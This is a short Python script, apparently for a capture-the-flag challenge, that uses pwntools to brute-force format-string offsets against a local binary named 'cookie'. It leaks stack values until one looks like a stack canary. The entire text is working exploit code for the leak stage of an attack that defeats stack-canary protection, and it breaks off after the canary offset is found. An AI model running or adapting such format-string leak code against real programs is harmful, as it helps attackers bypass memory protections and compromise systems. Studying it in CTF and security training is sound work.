from pwn import *

exe = './cookie' 
elf = ELF(exe)
context.binary = elf

def start():
    return process(exe)

canary_offset = 0
log.info("Brute-forcing canary offset...")

for i in range(0, 200):
    p = start()
    payload = f"%{i}$p".encode()
    p.sendline(payload)

    try:
        leak = p.recvline().strip().decode()
        if leak.startswith("0x") and leak.endswith("00") and len(leak) == 18:
            log.success(f"Found potential canary at offset {i}: {leak}")
            canary_offset = i
            p.close()
            break
    except:
        pass
    p.close()

if canary_offset == 0:
    log.error("Could not find canary! Check the binary.")
    exit()